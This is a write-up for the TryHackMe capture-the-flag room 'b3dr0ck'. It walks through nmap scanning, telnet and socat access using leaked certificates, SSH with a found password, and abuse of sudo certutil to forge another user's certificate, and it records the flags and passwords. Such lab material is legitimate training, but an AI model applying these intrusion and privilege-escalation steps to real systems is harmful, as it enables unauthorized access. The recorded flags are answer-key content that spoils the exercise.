# [b3dr0ck](https://tryhackme.com/room/b3dr0ck)

```
export IP=10.10.71.230
```

---

## Task 1
1. What is the barney.txt flag?

	a. nmap -sV -sC -oN nmap/initial -p 1-10000 $IP

	b. Research on Pichat yielded the attack vector:
	`telnet $IP 9009`

	c. Once in telnet, typing "help" gave us:
	```
	Looks like the secure login service is running on port: 54321

	Try connecting using:
	socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
	```

	d. Was able to find a private key by typing "key". Saved it as `private-key`.

	e. Was able to find a certificate by typing "cert". Saved it as `certificate`.

	f. Put it all together as suggested by the "help" command output and got access to socat:
	`socat stdio ssl:10.10.71.230:54321,cert=certificate,key=private-key,verify=0`

	g. Once in the socat, again typed "help" and got:
	```
	Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
	```

	h. Tried SSH using `barney` as the username and `d1ad7c0a3805955a35eb260dab4180dd` as the password and was able to get into the machine.

	i. Found the flag @ `/home/barney/barney.txt`:
	`THM{f05780f08f0eb1de65023069d0e4c90c}`


2. What is fred's password?

	a. Found what I had sudo access to by running `sudo -l` and using Barney's password, `d1ad7c0a3805955a35eb260dab4180dd`.

	b. Discovered I had access to certutil as Barney.

	c. Went to `https://gtfobins.github.io` to see if there were any easy priveledge escalations. There weren't.

	d. Running `certutil` in the command line yielded the help menu:
	```
	Cert Tool Usage:
	----------------

	Show current certs:
	  certutil ls

	Generate new keypair:
	  certutil [username] [fullname]
	```

	e. Used the `certutil` as sudo to generate new certifications for fred: `sudo certutil fred "Fred Flinstone"`. 

	f. Produced `fred-private-key` and `fred-certification`, which I then used to once again log in to `socat` using the command:
	`socat stdio ssl:10.10.71.230:54321,cert=fred-certificate,key=fred-private-key,verify=0`

	g. Typing "help" gave me fred's password:
	`YabbaDabbaD0000!`, which is the flag.


3. What is the fred.txt flag?

	a. After ssh'ing as `fred` (password: `YabbaDabbaD0000!`), I was able to find the flag @ `/home/fred/fred.txt`: 
	`THM{08da34e619da839b154521da7323559d}`


4. What is the root.txt flag?

